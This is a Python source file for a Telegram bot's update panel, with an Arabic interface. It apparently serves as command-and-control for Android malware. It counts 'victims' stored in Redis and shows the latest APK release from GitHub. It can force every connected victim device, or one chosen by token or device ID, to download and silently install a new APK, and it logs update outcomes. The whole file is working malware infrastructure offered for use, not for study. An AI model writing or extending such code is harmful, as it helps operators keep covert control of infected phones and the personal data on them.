# bot_handlers/callbacks/updates.py
import json
import time
import os
import shutil

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import bot, redis_client
from imports_manager import is_admin
from logging_config import get_logger

from ..helpers import safe_edit, h
from ..keyboards import build_update_panel

logger = get_logger("bot_handlers.callbacks.updates")


# ─── محاولة استيراد apk_updater ───
try:
    from apk_updater import (
        CURRENT_VERSION_CODE,
        CURRENT_VERSION_NAME,
        _find_latest_apk_release,
        _get_cached_apk_info,
    )
except ImportError:
    CURRENT_VERSION_CODE = 1
    CURRENT_VERSION_NAME = "1.0.0"
    def _find_latest_apk_release():
        return None
    def _get_cached_apk_info():
        return None


def handle(call, chat_id, user_id, data):
    # ─── حماية ───
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "❌ للأدمن فقط", show_alert=True)
        return

    if data == "upd_status":
        _status(call)
    elif data == "upd_check_release":
        _check_release(call)
    elif data == "upd_force_all":
        _force_all_prompt(call)
    elif data == "upd_force_all_confirm":
        _force_all_confirm(call)
    elif data == "upd_target":
        _target_prompt(call, chat_id)
    elif data == "upd_clear_cache":
        _clear_cache(call)
    elif data == "upd_history":
        _history(call)
    elif data == "upd_settings":
        _settings(call)


# ══════════════════════════════════════════════════
def get_update_status_text():
    try:
        version_code = CURRENT_VERSION_CODE
        version_name = CURRENT_VERSION_NAME
        latest = _get_cached_apk_info() or _find_latest_apk_release()

        total_victims = 0
        if redis_client:
            try:
                keys = redis_client.keys("victim:*")
                total_victims = len(keys) if keys else 0
            except Exception:
                pass

        update_success = 0
        update_failed = 0
        if redis_client:
            try:
                update_success = int(redis_client.get("stats:update_success") or 0)
                update_failed = int(redis_client.get("stats:update_failed") or 0)
            except Exception:
                pass

        force_active = False
        if redis_client:
            try:
                force_active = bool(redis_client.get("apk_force_update"))
            except Exception:
                pass

        text = (
            "📊 <b>حالة نظام التحديث</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "🔢 <b>النسخة الحالية على السيرفر:</b>\n"
            f"  • الكود: <code>{version_code}</code>\n"
            f"  • الاسم: <code>{version_name}</code>\n\n"
            "📦 <b>آخر Release على GitHub:</b>\n"
        )

        if latest:
            text += (
                f"  • الاسم: <code>{h(latest.get('version_name', '?'))}</code>\n"
                f"  • الحجم: <code>{latest.get('size', 0) / 1024 / 1024:.2f} MB</code>\n"
            )
        else:
            text += "  • <i>لا يوجد release</i>\n"

        text += (
            "\n👥 <b>الضحايا:</b>\n"
            f"  • الإجمالي: <code>{total_victims}</code>\n\n"
            "📈 <b>إحصائيات التحديث:</b>\n"
            f"  • ✅ نجح: <code>{update_success}</code>\n"
            f"  • ❌ فشل: <code>{update_failed}</code>\n\n"
            "🎯 <b>Force Update:</b>\n"
            f"  • الحالة: {'🔴 نشط' if force_active else '⚪ غير نشط'}\n"
        )

        return text
    except Exception as e:
        logger.exception(f"get_update_status_text error: {e}")
        return f"❌ خطأ في قراءة الحالة: {h(str(e)[:200])}"


def _status(call):
    bot.answer_callback_query(call.id, "📊 جاري القراءة...")
    text = get_update_status_text()
    safe_edit(call, text, reply_markup=build_update_panel())


def _check_release(call):
    bot.answer_callback_query(call.id, "🔍 جاري الفحص...")
    try:
        latest = _find_latest_apk_release()
        if latest:
            text = (
                "🔍 <b>آخر Release على GitHub</b>\n"
                "━━━━━━━━━━━━━━━━━━\n\n"
                f"📦 <b>الاسم:</b> <code>{h(latest.get('name', '?'))}</code>\n"
                f"🏷️ <b>الإصدار:</b> <code>{h(latest.get('version_name', '?'))}</code>\n"
                f"💾 <b>الحجم:</b> <code>{latest.get('size', 0) / 1024 / 1024:.2f} MB</code>\n"
                f"📅 <b>التاريخ:</b> <code>{h(latest.get('published_at', '?'))}</code>\n"
            )
        else:
            text = "❌ <b>لا يوجد APK على GitHub Releases</b>"
    except Exception as e:
        logger.exception(f"upd_check_release error: {e}")
        text = f"❌ خطأ: {h(str(e)[:200])}"
    safe_edit(call, text, reply_markup=build_update_panel())


def _force_all_prompt(call):
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("✅ نعم، شغّل التحديث الشامل", callback_data="upd_force_all_confirm"),
        InlineKeyboardButton("❌ إلغاء", callback_data="upd_status"),
    )
    bot.answer_callback_query(call.id)
    safe_edit(
        call,
        "⚠️ <b>تأكيد التحديث الشامل</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🚨 هذا الأمر سيجبر <b>كل الضحايا المتصلين</b> على:\n"
        "• فحص وجود تحديث فوراً\n"
        "• تحميل التحديث الجديد\n"
        "• تثبيته تلقائياً\n\n"
        "هل أنت متأكد؟",
        reply_markup=m
    )


def _force_all_confirm(call):
    bot.answer_callback_query(call.id, "🚀 جاري التنفيذ...")
    try:
        if redis_client:
            redis_client.setex("apk_force_update", 3600, str(int(time.time())))
            victims = 0
            try:
                victims = len(redis_client.keys("victim:*") or [])
            except Exception:
                pass
            text = (
                "✅ <b>تم تفعيل التحديث الشامل</b>\n"
                "━━━━━━━━━━━━━━━━━━\n\n"
                f"👥 <b>الضحايا المتأثرون:</b> ~<code>{victims}</code>\n"
                f"⏰ <b>المدة:</b> ساعة واحدة\n"
            )
        else:
            text = "❌ Redis غير متصل"
    except Exception as e:
        logger.exception(f"upd_force_all_confirm error: {e}")
        text = f"❌ خطأ: {h(str(e)[:200])}"
    safe_edit(call, text, reply_markup=build_update_panel())


def _target_prompt(call, chat_id):
    bot.answer_callback_query(call.id)
    msg = bot.send_message(
        chat_id,
        "🎯 <b>تحديث ضحية محددة</b>\n\n"
        "أرسل <b>Victim Token</b> أو <b>Device ID</b>",
        parse_mode="HTML"
    )
    from ..steps.update_steps import upd_target_handler
    bot.register_next_step_handler(msg, upd_target_handler)


def _clear_cache(call):
    bot.answer_callback_query(call.id, "♻️ جاري المسح...")
    try:
        if redis_client:
            redis_client.delete("apk_current_info")
            cache_dir = os.getenv("APK_CACHE_DIR", "/tmp/apk_cache")
            if os.path.exists(cache_dir):
                try:
                    shutil.rmtree(cache_dir)
                    os.makedirs(cache_dir, exist_ok=True)
                except Exception:
                    pass
        safe_edit(call, "✅ <b>تم مسح Cache</b>", reply_markup=build_update_panel())
    except Exception as e:
        logger.exception(f"upd_clear_cache error: {e}")
        safe_edit(call, f"❌ {h(str(e)[:200])}", reply_markup=build_update_panel())


def _history(call):
    bot.answer_callback_query(call.id, "📜 جاري القراءة...")
    try:
        if not redis_client:
            safe_edit(call, "❌ Redis غير متصل", reply_markup=build_update_panel())
            return
        history_raw = redis_client.lrange("update_history", 0, 19) or []
        if not history_raw:
            text = "📜 <b>سجل التحديثات</b>\n\n<i>لا يوجد سجل بعد</i>"
        else:
            lines = ["📜 <b>آخر 20 تحديث</b>\n━━━━━━━━━━━━━━━━━━"]
            for item in history_raw:
                try:
                    entry = json.loads(item) if isinstance(item, str) else item
                    status = entry.get("status", "?")
                    token = entry.get("token", "?")[:12]
                    ts = entry.get("time_str", "?")
                    icon = "✅" if status == "success" else "❌"
                    lines.append(f"{icon} <code>{h(token)}</code> — {h(ts)}")
                except Exception:
                    continue
            text = "\n".join(lines)
    except Exception as e:
        logger.exception(f"upd_history error: {e}")
        text = f"❌ {h(str(e)[:200])}"
    safe_edit(call, text, reply_markup=build_update_panel())


def _settings(call):
    bot.answer_callback_query(call.id)
    try:
        text = (
            "⚙️ <b>إعدادات التحديث</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📌 <b>السيرفر:</b>\n"
            f"  • النسخة: <code>{CURRENT_VERSION_NAME}</code>\n"
            f"  • الكود: <code>{CURRENT_VERSION_CODE}</code>\n"
        )
    except Exception as e:
        text = f"❌ {h(str(e)[:200])}"
    safe_edit(call, text, reply_markup=build_update_panel())
